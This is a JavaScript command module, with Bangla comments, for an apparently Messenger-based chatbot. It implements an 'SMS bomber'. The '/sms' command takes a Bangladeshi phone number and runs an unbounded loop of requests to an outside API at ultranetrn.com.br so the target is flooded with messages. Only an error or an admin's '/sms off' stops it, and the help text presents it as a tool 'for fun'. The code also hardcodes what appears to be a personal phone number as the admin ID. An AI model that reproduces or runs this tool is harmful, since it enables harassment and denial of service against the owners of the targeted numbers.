module.exports.config = {
  name: "sms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️",
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off (শুধুমাত্র অ্যাডমিন)",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { axios: "" }
};

const axios = require("axios");
const bombingFlags = {};

// **এখানে তোমার অ্যাডমিন নাম্বার বসাও**
const ADMIN_ID = "01715559179";

function getBanglaMonth(monthIndex) {
  const months = [
    "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
    "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"
  ];
  return months[monthIndex];
}

function formatDateTime(date) {
  const year = date.getFullYear();
  const month = getBanglaMonth(date.getMonth());
  const day = date.getDate();
  const hours = date.getHours().toString().padStart(2, "0");
  const minutes = date.getMinutes().toString().padStart(2, "0");
  const seconds = date.getSeconds().toString().padStart(2, "0");

  return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds}`;
}

function checkAdminID() {
  if (!ADMIN_ID || ADMIN_ID.trim() === "100013678366954") {
    console.error("❌ ERROR: ADMIN_ID সেট করা নেই। বট বন্ধ করা হচ্ছে।");
    for (const thread in bombingFlags) {
      bombingFlags[thread] = false;
    }
    // process.exit(1); // চাইলে পুরো প্রোগ্রাম বন্ধ করতে uncomment করো
    return false;
  }
  return true;
}

module.exports.run = async ({ api, event, args }) => {
  if (!checkAdminID()) return;

  const threadID = event.threadID;
  const senderID = event.senderID;
  const number = args[0];

  const latitude = 23.8103;
  const longitude = 90.4125;
  const locationURL = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

  const helpMessage =
    "•┄┅════❁🌺❁════┅┄•\n\n" +
    "☠️••SMS BOMBER BY —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️💣\n\n" +
    "ব্যবহার:\n" +
    "1. /sms 01xxxxxxxxx  (বাংলাদেশি নাম্বার)\n" +
    "2. /sms off        (বোম্বিং বন্ধ করতে - শুধুমাত্র অ্যাডমিন)\n" +
    "3. বোম্বিং চলাকালে /sms off দিলে বন্ধ হবে\n" +
    "4. শুধুমাত্র বাংলাদেশের নম্বর কাজ করবে\n" +
    "5. নম্বর ১১ ডিজিট হতে হবে\n" +
    "6. বোম্বিং চলাকালে অন্য কেউ আর বোম্বিং শুরু করতে পারবে না\n" +
    "7. মজার জন্য ব্যবহার করুন\n\n" +
    "•┄┅════❁🌺❁════┅┄•";

  if (!number) {
    return api.sendMessage(helpMessage, threadID);
  }

  if (number === "off") {
    if (senderID !== ADMIN_ID) {
      return api.sendMessage("❌ শুধুমাত্র অ্যাডমিনই বট বন্ধ করতে পারে।", threadID);
    }
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(helpMessage, threadID);
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off", threadID);
  }

  bombingFlags[threadID] = true;

  const now = new Date();
  const formattedDateTime = formatDateTime(now);

  api.sendMessage(
    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে।\n\n⏰ সময়: ${formattedDateTime}\n📍 লোকেশন: ${locationURL}\n\nবন্ধ করতে /sms off`,
    threadID
  );

  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
